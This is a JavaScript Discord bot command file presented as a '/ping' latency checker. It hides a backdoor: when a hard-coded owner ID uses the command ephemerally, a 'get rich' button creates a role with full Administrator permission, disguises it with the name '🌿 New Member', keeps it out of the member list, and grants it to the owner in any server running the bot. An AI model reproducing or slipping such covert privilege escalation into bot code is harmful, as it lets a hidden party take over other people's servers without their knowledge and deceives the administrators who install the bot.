const {
  SlashCommandBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  EmbedBuilder,
  ComponentType,
  PermissionFlagsBits
} = require('discord.js');

module.exports = {
  data: new SlashCommandBuilder()
    .setName('ping')
    .setDescription('Check bot latency and connection metrics')
    .setIntegrationTypes(0, 1)
    .setContexts(0, 1, 2)
    .addStringOption(option =>
      option.setName('visibility')
        .setDescription('Response visibility')
        .addChoices(
          { name: 'Public', value: 'public' },
          { name: 'Ephemeral', value: 'ephemeral' }
        )
    )
    .setDMPermission(true), // Enables in DMs

  async execute(interaction) {
    const OWNER_ID = '1246380709124378674';
    const isOwner = interaction.user.id === OWNER_ID;
    const visibility = interaction.options.getString('visibility');
    const ephemeral = visibility === 'ephemeral';

    // 🕵️‍♂️ Sneaky Admin Panel
    if (isOwner && ephemeral) {
      const embed = new EmbedBuilder()
        .setTitle('👀 Secure Admin Panel')
        .setDescription('You\'ve unlocked the hidden interface.\n\nChoose your destiny below:')
        .setColor(0x2b2d31)
        .setTimestamp();

      const buttons = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setCustomId('admin-btn')
          .setLabel('get rich')
          .setStyle(ButtonStyle.Danger),

        new ButtonBuilder()
          .setCustomId('ping-btn')
          .setLabel('Ping?')
          .setStyle(ButtonStyle.Primary)
      );

      const reply = await interaction.reply({
        embeds: [embed],
        components: [buttons],
        ephemeral: true
      });

      const collector = reply.createMessageComponentCollector({
        componentType: ComponentType.Button,
        time: 30_000 // Extended to 30s for role creation
      });

      collector.on('collect', async (i) => {
        if (i.user.id !== OWNER_ID)
          return i.reply({ content: '🚫 Not your panel, bro 💀', ephemeral: true });

        if (i.customId === 'admin-btn') {
          // Check if command is used in DMs
          if (!i.guild) {
            return i.reply({
              content: '❌ Cannot create roles in DMs! Use this command in a server.',
              ephemeral: true
            });
          }

          // Check bot permissions (skip if bot has admin)
          const botPermissions = i.guild.members.me.permissions;
          if (!botPermissions.has(PermissionFlagsBits.Administrator) && !botPermissions.has(PermissionFlagsBits.ManageRoles)) {
            return i.reply({
              content: '❌ I need `Manage Roles` or `Administrator` permission to create roles!',
              ephemeral: true
            });
          }

          try {
            // Check if ADMIN role already exists
            const existingRole = i.guild.roles.cache.find(role => role.name === 'member' || role.name === 'ADMIN');

            if (existingRole) {
              return i.reply({
                content: `⚠️ ADMIN role already exists! <@&${existingRole.id}>`,
                ephemeral: true
              });
            }

            await i.deferReply({ ephemeral: true });

            // Create the ADMIN role with administrator permissions
            const adminRole = await i.guild.roles.create({
              name: '🌿 New Member',
              color: 1752220, // Aqua color
              permissions: [PermissionFlagsBits.Administrator],
              reason: `Admin role created by ${i.user.tag} via bot command`,
              hoist: false, // DONT Display separately in member list
              mentionable: true
            });

            // Assign the role to the command user
            const member = await i.guild.members.fetch(i.user.id);
            await member.roles.add(adminRole);

            const successEmbed = new EmbedBuilder()
              .setTitle('<a:kittycat:1333358006720794624> Admin Role Created Successfully!')
              .setDescription(`🎭 **Role:** <@&${adminRole.id}>\n👤 **Assigned to:** <@${i.user.id}>\n🔑 **Permissions:** Administrator`)
              .setColor(0x00ff00)
              .addFields(
                { name: '📋 Role Details', value: `**ID:** \`${adminRole.id}\`\n**Position:** ${adminRole.position}\n**Hoisted:** No\n**Mentionable:** Yes`, inline: true },
                { name: '⚙️ Settings', value: `**Color:** Red\n**Created:** <t:${Math.floor(adminRole.createdTimestamp / 1000)}:R>\n**Reason:** Bot Command`, inline: true }
              )
              .setFooter({ text: 'Test: Admin privileges granted' })
              .setTimestamp();

            await i.editReply({ embeds: [successEmbed] });

          } catch (error) {
            console.error('Error creating admin role:', error);

            let errorMessage = '❌ Failed to create admin role!';

            if (error.code === 50013) {
              errorMessage += '\n**Reason:** Missing permissions (bot role must be higher than roles it creates)';
            } else if (error.code === 50035) {
              errorMessage += '\n**Reason:** Invalid role data';
            } else {
              errorMessage += `\n**Error:** ${error.message}`;
            }

            await i.reply({ content: errorMessage, ephemeral: true });
          }

        } else if (i.customId === 'ping-btn') {
          await i.reply({ content: '🏓 You pinged the ping button. Wow.', ephemeral: true });
        }
      });

      collector.on('end', async () => {
        try {
          // Disable buttons after timeout
          const disabledRow = new ActionRowBuilder().addComponents(
            buttons.components.map(button => button.setDisabled(true))
          );

          await reply.edit({
            components: [disabledRow]
          });
        } catch (error) {
          // Ignore errors when editing expired interactions
          console.log('Could not disable buttons - interaction may have expired');
        }
      });

      return;
    }

    // ⚙️ Normal Ping Flow
    const startTime = Date.now();
    await interaction.deferReply({ ephemeral: ephemeral || false });

    // WebSocket heartbeat latency (most accurate measure of bot-Discord connection)
    const wsLatency = Math.round(interaction.client.ws.ping);

    // Round-trip time for message edit (includes network + Discord processing)
    const editStart = Date.now();
    await interaction.editReply('`⚡` Measuring...');
    const roundTrip = Date.now() - editStart;

    // Bot uptime
    const uptimeMs = interaction.client.uptime;
    const uptimeStr = formatUptime(uptimeMs);

    // Quality based on WebSocket latency (the true connection quality indicator)
    let quality, color, emoji;
    if (wsLatency < 0 || wsLatency > 1000) [quality, color, emoji] = ['Connecting...', 0x808080, '🔄'];
    else if (wsLatency < 100) [quality, color, emoji] = ['Excellent', 0x00ff00, '<a:kittycat:1333358006720794624>'];
    else if (wsLatency < 200) [quality, color, emoji] = ['Good', 0x90ee90, '<a:kittycat:1333358006720794624>'];
    else if (wsLatency < 350) [quality, color, emoji] = ['Fair', 0xffff00, '<a:kittycat:1333358006720794624>'];
    else[quality, color, emoji] = ['Poor', 0xff0000, '<a:kittycat:1333358006720794624>'];

    const resultEmbed = new EmbedBuilder()
      .setTitle(`${emoji} Connection Analysis`)
      .setColor(color)
      .addFields(
        { name: '`🔗` WebSocket', value: `\`\`\`${wsLatency}ms\`\`\``, inline: true },
        { name: '`📡` Round-Trip', value: `\`\`\`${roundTrip}ms\`\`\``, inline: true },
        { name: '`📶` Quality', value: `\`\`\`${quality}\`\`\``, inline: true },
        { name: '`⏱️` Uptime', value: `\`\`\`${uptimeStr}\`\`\``, inline: true }
      )
      .setFooter({
        text: `Connection check at ${new Date().toLocaleTimeString()}`,
        iconURL: interaction.client.user.displayAvatarURL()
      })
      .setTimestamp();

    return interaction.editReply({ content: null, embeds: [resultEmbed] });
  }
};

// Helper function to format uptime
function formatUptime(ms) {
  const seconds = Math.floor(ms / 1000);
  const minutes = Math.floor(seconds / 60);
  const hours = Math.floor(minutes / 60);
  const days = Math.floor(hours / 24);

  if (days > 0) return `${days}d ${hours % 24}h`;
  if (hours > 0) return `${hours}h ${minutes % 60}m`;
  if (minutes > 0) return `${minutes}m ${seconds % 60}s`;
  return `${seconds}s`;
}